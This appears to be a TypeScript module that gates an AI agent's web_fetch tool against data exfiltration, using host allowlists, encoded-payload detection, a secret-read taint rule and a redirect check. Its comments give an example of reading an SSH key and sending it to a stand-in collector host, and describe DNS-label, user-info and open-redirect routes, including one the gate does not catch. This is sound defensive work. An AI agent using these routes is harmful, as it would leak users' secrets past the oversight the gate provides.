import { hasConversationReadSecret } from './exfilTaint';
import type { ForgeConfig } from '../config/types';

/**
 * Which hosts a chat may fetch, and what a fetch has to ask for.
 *
 * `web_fetch` needs no approval today, so `read_file ~/.ssh/id_ed25519` followed
 * by `web_fetch https://collector.example.net/?d=<base64>` runs with no prompt:
 * read the secret, send it out, nobody asked. The browser tools already solved
 * this for themselves — an origin in `browser.allowed_origins` is pre-approved,
 * any other origin asks once per browser session, and the set dies with the
 * browser (`src/tools/browser/BrowserSessionManager.ts`) — so this module gives
 * `web_fetch` the same model, plus the two rules a browser session does not
 * need: a URL carrying a large encoded payload asks even on an approved host,
 * and a chat that has read a secret pays for its next fetch.
 *
 * The approved-host set is in memory and per chat, on purpose: it is never
 * written to disk and there is no "always allow" button, because a host the
 * agent got approved once in a chat should not be approved for every chat that
 * ever runs on this machine. To keep a host permanently, the owner puts it in
 * `fetch.allowed_hosts` in config.yaml by hand.
 */

/** A query or path segment longer than this is carrying data, not naming a page. */
export const PAYLOAD_SEGMENT_LIMIT = 512;
/** A base64/hex run this long is not an accident of someone's URL: it is a payload. */
export const ENCODED_RUN_LIMIT = 64;
/**
 * The same idea for the parts of a URL that can never reach `ENCODED_RUN_LIMIT`.
 * A DNS label tops out at 63 characters, so a 64-character run can never match
 * inside one, and a URL user info field is normally shorter than 512. 32
 * characters of base64 is 24 bytes, of base32 20: a token, a key id, half a
 * secret — worth asking about, and longer than any ordinary subdomain label or
 * user name.
 */
export const ENCODED_LABEL_LIMIT = 32;

/**
 * The hostname a host rule is judged against: lower-cased, with the brackets
 * `[::1]` carries in a URL stripped. Owned here because both `web_fetch` and the
 * `render_html_to_image` preview gate need the same spelling, and two spellings
 * of a hostname is how a host check gets bypassed.
 */
export function normalizedHostname(url: URL): string {
  return url.hostname.toLowerCase().replace(/^\[|\]$/gu, '');
}

/**
 * Does this host match one entry of `fetch.allowed_hosts`?
 *
 * An entry is an exact hostname or a `*.suffix` wildcard. The wildcard matches
 * on a label boundary, not as a substring: `*.readthedocs.io` matches
 * `requests.readthedocs.io` and must NOT match `readthedocs.io.collector.net`,
 * which is the shape an attacker picks when they control the suffix-looking
 * tail (docs/plans/EXFIL_GATES_PLAN.md example 2). The wildcard also covers the
 * bare domain, so `*.python.org` does not leave `python.org` asking.
 */
export function hostMatchesPattern(host: string, pattern: string): boolean {
  const wanted = pattern.trim().toLowerCase();
  if (wanted.length === 0) return false;
  if (wanted.startsWith('*.')) {
    const suffix = wanted.slice(2);
    return suffix.length > 0 && (host === suffix || host.endsWith(`.${suffix}`));
  }
  return host === wanted;
}

export function hostMatchesList(host: string, patterns: readonly string[]): boolean {
  return patterns.some((pattern) => hostMatchesPattern(host, pattern));
}

/** `fetch.allowed_hosts`, whatever the owner typed; the default is empty, so
 *  everything asks until they say otherwise. */
export function allowedHostsFor(config: ForgeConfig | undefined): string[] {
  const raw = config?.fetch?.allowed_hosts;
  return Array.isArray(raw) ? raw.filter((value) => typeof value === 'string') : [];
}

/** The longest run of encoded-looking characters in one value. */
function longestEncodedRun(value: string): number {
  let best = 0;
  for (const run of value.match(/[A-Za-z0-9+/=_-]{64,}/gu) ?? []) best = Math.max(best, run.length);
  return best;
}

/**
 * The longest run of alphanumeric characters that also contains a digit, over
 * `alphabet`, or 0 when none is long enough. Hyphens, dots, underscores and the
 * base64 punctuation break a run, and that is the point: it is what keeps an
 * ELB's `alb-<hex>-<hex>` (runs 3, 16, 16) and every hyphenated service name
 * clear while a base32 or base64 blob of the same length stays one run. The
 * digit is required because 32 letters is still how a long word looks.
 */
function longestDigitRun(value: string, alphabet: RegExp): number {
  let best = 0;
  for (const run of value.match(alphabet) ?? []) {
    if (run.length > best && /[0-9]/u.test(run)) best = run.length;
  }
  return best;
}

/**
 * A host label is measured lower-cased — `normalizedHostname` lower-cases the
 * whole host, as WHATWG `URL` does for every ASCII hostname — so case cannot be
 * part of its rule. Length and digits are all a label gives up: base32
 * (`a-z2-7`), the usual DNS exfil encoding, is all lower case, and so is a hex
 * hash, which is just the special case of this rule.
 */
const HOST_DATA_RUN = new RegExp(`[a-z0-9]{${ENCODED_LABEL_LIMIT},}`, 'gu');
/** User info keeps its case and can carry `+` and `/`, so its runs are measured
 *  over the base64 alphabet instead of being cut by them. */
const USER_DATA_RUN = new RegExp(`[A-Za-z0-9+/=_-]{${ENCODED_LABEL_LIMIT},}`, 'gu');

/**
 * Does this user info field look like data rather than like a name someone
 * chose? Base64 of real data is mixed case and contains digits; a lower-case
 * hex or base32 blob contains digits and is all in the encoded alphabet; a user
 * name is neither. Requiring a digit is what keeps `admin`, `deploy` and
 * `ci-robot` out of the count. Unlike a host label this piece keeps its case,
 * so the mixed-case arm stays, and `+` and `/` do not break it up.
 */
function looksEncoded(value: string): boolean {
  if (!/[0-9]/u.test(value)) return false;
  return (/[A-Z]/u.test(value) && /^[A-Za-z0-9+/=_-]+$/u.test(value)) || /^[0-9a-f]+$/u.test(value);
}

/**
 * The user info, percent-decoded: `url.username` keeps `%2B` for a base64 `+`,
 * and a payload written that way is still the same payload — the query values
 * below are measured decoded for the same reason. A malformed escape is measured
 * as it stands, because a gate must not throw on a URL it is only judging.
 */
function decodedUserInfo(url: URL): string[] {
  return [url.username, url.password]
    .filter((field) => field.length > 0)
    .map((field) => {
      try {
        return decodeURIComponent(field);
      } catch {
        return field;
      }
    });
}

/**
 * Characters of data the hostname carries below the registrable domain —
 * `https://<60>.<60>.collector.net/` is the shape, and `https://<60>.collector.net/`
 * is the case a sum of 60 would miss. Two arms, because each catches what the
 * other cannot:
 *
 *   1. the labels before the registrable part adding up to `ENCODED_RUN_LIMIT`
 *      characters or more — a payload split across several labels;
 *   2. one such label carrying a `[a-z0-9]` run of `ENCODED_LABEL_LIMIT` or
 *      more that contains a digit — because a label can never reach 64, the run
 *      rule is dead inside one, and because the host is lower-cased, a rule that
 *      asked for mixed case would be dead there too.
 *
 * A single label (`localhost`), an IP literal or a host that IS the registrable
 * domain has nothing below it to measure. `docs.python.org` (4),
 * `raw.githubusercontent.com` (3), CloudFront's 14-character hash label, an
 * ELB's 37-character `alb-<hex>-<hex>` (the hyphens split it into runs of 3,
 * 16 and 16) and a deep chain of ordinary subdomains all stay under both bars.
 * What does ask is a label of 32 or more characters with a digit in it — which
 * is exactly the base32 and hex hash shape, so a hash-named subdomain asks. A
 * mixed-case word label with a digit (`My-Company-Portal-Prod-2-EU-West-1`)
 * asks too and does not need to: for a gate whose whole job is a hostname
 * carrying data, that is the safe direction to err.
 *
 * Stated limitation, not hidden: data split across many *short* labels
 * (`aHRl.bGxv.Mj34.collector.net`) is under both bars. It still gets a card — a
 * new host always does — but that card is the ordinary one an unattended run
 * approves, so the gap is for autonomous runs, not for a person reading it.
 */
function hostnameEncodedChars(host: string): number {
  const labels = host.split('.');
  if (labels.length <= 2) return 0;
  const sub = labels.slice(0, -2);
  let encoded = 0;
  for (const label of sub) {
    if (longestDigitRun(label, HOST_DATA_RUN) > 0) encoded += label.length;
  }
  const sum = sub.reduce((count, label) => count + label.length, 0);
  return Math.max(encoded, sum >= ENCODED_RUN_LIMIT ? sum : 0);
}

/**
 * Characters of encoded data the URL is carrying in its path, query, user info
 * or hostname.
 *
 * Measured per VALUE, not over the whole URL: `?d=<62 characters>` is a search
 * term someone typed, and counting the `d=` in front of it would have made every
 * query longer than 62 characters a payload — which is most of the searches the
 * agent runs. A path segment or a query value over `PAYLOAD_SEGMENT_LIMIT` is
 * counted whole, because a 900-character query is data regardless of alphabet.
 *
 * The path and the query are not the only ways out, and the two arms below are
 * what `https://<60>.<60>.collector.net/` and `https://<base64>@collector.net/`
 * have in common: an empty path and an empty query, and the data somewhere the
 * per-value rule could not look. The user info is a value like any other; the
 * hostname gets the lower `ENCODED_LABEL_LIMIT` bar, which is deliberately NOT
 * applied to path segments and query values — those are prose a person typed
 * (`?q=Visual Studio 2026 Enterprise Edition Release Notes` has digits and
 * capitals and carries nothing).
 */
export function encodedPayloadChars(url: URL): number {
  const user = decodedUserInfo(url);
  const segments = url.pathname.split('/').filter((part) => part.length > 0);
  const values = [...url.searchParams.values(), ...user];
  let runs = 0;
  let long = 0;
  for (const part of [...segments, ...values]) {
    runs += longestEncodedRun(part);
    if (part.length > PAYLOAD_SEGMENT_LIMIT) long += part.length;
  }
  let below = hostnameEncodedChars(normalizedHostname(url));
  for (const field of user) {
    if (
      field.length >= ENCODED_LABEL_LIMIT &&
      (looksEncoded(field) || longestDigitRun(field, USER_DATA_RUN) > 0)
    ) {
      below += field.length;
    }
  }
  return Math.max(runs, long, below);
}

export interface FetchApproval {
  detail: string;
  /** False for a host card: an unattended turn approves a brand-new host by itself,
   *  which is what keeps a run from stalling on a page nobody asked for. */
  dangerous: boolean;
  /** What made this card exist. Absent when this object is only the card's TEXT
   *  (`cardTextOnly`): a chat that cards this fetch for a different reason knows
   *  its own reason better, and `ToolDispatch` takes the card's reason from
   *  whichever gate raised it, so a line written here would overwrite the
   *  explanation of why the card was raised. */
  cardReason?: string;
  declineHint?: string;
  gateKind?: 'ownerGate' | 'taintGate';
  /** True when the host is already approved (for this chat, or by
   *  `fetch.allowed_hosts`) so there is nothing to ask: this is the card's text and
   *  the key, not a gate. `untrustedExitPolicy.ts` still cards the fetch when this
   *  chat has taken in outside content, and that card is answered by the key below —
   *  which is why the key is returned even when nothing is being asked.
   *
   *  It is not a gate, so a clean chat runs the fetch with no card exactly as before
   *  (`cardTextOnly` is what `ToolDispatch` uses to tell the card's text from a gate).
   */
  cardTextOnly?: boolean;
  /** `net:<normalized host>`. The key for this fetch, set for every row this
   *  function can name a host for; the secret-tainted and payload rows deliberately
   *  carry none, because their card is about the payload or the chat, not the host,
   *  and a key for the host would let a chat rule answer a payload fetch. Read only
   *  by `approvalKey.ts`; the approved-host half is answered from the fetch store
   *  itself, so there is one source of truth per host. */
  approvalKey?: string;
}

/**
 * What this fetch needs, or `undefined` when it may run without a card.
 *
 * The order is the design: a chat that has read a secret is judged first,
 * because that is the exfiltration and the only row of the table that the owner
 * alone may settle; then the payload, which asks even on a host the owner
 * allowed (an approved host with a 1,842-character base64 query is still a
 * secret on its way out); then the host rules.
 *
 * A new host is an ordinary, non-dangerous card, so `/clanker` and an unattended
 * turn approve it automatically and no gate in this plan stalls a run. A payload
 * and a secret-tainted fetch are dangerous cards, which in an autonomous run are
 * refused at once — the payload as the owner's gate (`ownerGate`), the secret
 * read as the gate nothing but the owner may settle (`taintGate`).
 */
export function fetchApprovalFor(
  rawUrl: string,
  config: ForgeConfig | undefined,
  conversationId: string | undefined,
): FetchApproval | undefined {
  let url: URL;
  try {
    url = new URL(rawUrl);
  } catch {
    // `web_fetch`'s own SSRF check rejects a URL this cannot read, so there is
    // nothing here to judge: no card, and the handler says why.
    return undefined;
  }
  // The full URL, query string included: that is where stolen data travels, and
  // a card that showed only the host would hide exactly the thing to look at.
  const detail = `GET ${url.toString()}`;
  if (hasConversationReadSecret(conversationId)) {
    return {
      detail,
      dangerous: true,
      cardReason: 'this chat has read a secret path, so nothing more leaves it without you',
      declineHint:
        'tell the owner what you need from this host; a secret read taints the whole chat',
      gateKind: 'taintGate',
    };
  }
  const payload = encodedPayloadChars(url);
  if (payload > 0) {
    return {
      detail,
      dangerous: true,
      cardReason: `URL carries ${String(payload)} characters of encoded data`,
      declineHint:
        'fetch the page without the encoded value in its query, or ask the owner to add this host to fetch.allowed_hosts',
      gateKind: 'ownerGate',
    };
  }
  const host = normalizedHostname(url);
  // Already approved — by this chat, or by the owner's `fetch.allowed_hosts`.
  // There is nothing to ask, so this used to return nothing at all. It now returns
  // the card's text and the key with `cardTextOnly`, which is not a gate: a clean
  // chat still runs this fetch with no card, exactly as before. The key is returned
  // because a chat that HAS taken in outside content cards the same fetch through
  // the exit rule, and that card needs a key to be answerable by the approval this
  // chat already holds.
  if (isHostApproved(conversationId, host)) {
    return { detail, dangerous: false, cardTextOnly: true, approvalKey: `net:${host}` };
  }
  if (hostMatchesList(host, allowedHostsFor(config))) {
    return { detail, dangerous: false, cardTextOnly: true, approvalKey: `net:${host}` };
  }
  return {
    detail,
    dangerous: false,
    cardReason: `new host for this chat: ${host}`,
    approvalKey: `net:${host}`,
  };
}

// ── the per-chat set ──────────────────────────────────────────────────────────

const approvedHostsByChat = new Map<string, Set<string>>();

/** Has this chat already approved this host? */
export function isHostApproved(conversationId: string | undefined, host: string): boolean {
  if (!conversationId) return false;
  return approvedHostsByChat.get(conversationId)?.has(host.toLowerCase()) === true;
}

/**
 * Approve the host for the rest of this chat. Called by the handler, which only
 * runs on a call that was approved — so a declined card adds nothing, and the
 * host stays unapproved until somebody actually says yes.
 */
export function markHostApproved(conversationId: string | undefined, host: string): void {
  if (!conversationId) return;
  const normalized = host.toLowerCase();
  const set = approvedHostsByChat.get(conversationId);
  if (set) set.add(normalized);
  else approvedHostsByChat.set(conversationId, new Set([normalized]));
}

/** Every host this chat has approved — for the tests that prove clearing works. */
export function approvedHostsFor(conversationId: string | undefined): string[] {
  if (!conversationId) return [];
  return [...(approvedHostsByChat.get(conversationId) ?? [])];
}

const MAX_APPROVED_HOSTS_IN_REFUSAL = 10;

function approvedHostsSummary(
  config: ForgeConfig | undefined,
  conversationId: string | undefined,
): string {
  const hosts = [
    ...new Set(
      [...allowedHostsFor(config), ...approvedHostsFor(conversationId)]
        .map((host) => host.trim().toLowerCase())
        .filter(Boolean),
    ),
  ].sort();
  const visible = hosts.slice(0, MAX_APPROVED_HOSTS_IN_REFUSAL);
  const omitted = hosts.length - visible.length;
  const list = visible.length > 0 ? visible.join(', ') : 'none';
  const more = omitted > 0 ? `, plus ${String(omitted)} more` : '';
  return `Hosts approved for this chat (from fetch.allowed_hosts or approved earlier in this chat): ${list}${more}.`;
}

/** Chat closed, `/clearChat`, window reload: the set goes with the chat. */
export function clearConversationHostApprovals(conversationId?: string): void {
  if (conversationId === undefined) approvedHostsByChat.clear();
  else approvedHostsByChat.delete(conversationId);
}

/**
 * May this chat reach `host` without asking: either the owner listed it in
 * `fetch.allowed_hosts`, or a card for it was answered earlier in this chat.
 *
 * `web_fetch`'s redirect gate and the `render_html_to_image` preview gate ask
 * this same question, so it has one owner — two implementations of "is this host
 * approved" is how one of them gets a rule the other forgot.
 */
export function hostApprovedForChat(
  config: ForgeConfig | undefined,
  conversationId: string | undefined,
): (host: string) => boolean {
  const allowed = allowedHostsFor(config);
  return (host: string) =>
    hostMatchesList(host, allowed) || isHostApproved(conversationId, host.toLowerCase());
}

/**
 * The gate a redirect has to pass before it is followed.
 *
 * Without it, an open redirect on an approved host (`www.google.com/url?q=…`)
 * launders a request to any host on the internet: the card was answered for
 * google, and the bytes went to the collector. The message names the host and
 * the sanctioned next step, so the agent can do it instead of inventing one.
 */
export function redirectGate(
  config: ForgeConfig | undefined,
  conversationId: string | undefined,
): (url: URL) => string | undefined {
  const approved = hostApprovedForChat(config, conversationId);
  return (url: URL) => {
    const host = normalizedHostname(url);
    if (approved(host)) return undefined;
    return (
      `the redirect goes to ${host}, a host not approved in this chat, so it was ` +
      `not followed. ${approvedHostsSummary(config, conversationId)} ` +
      `To get another host approved, call web_fetch with ${url.toString()} directly; that asks the user.`
    );
  };
}
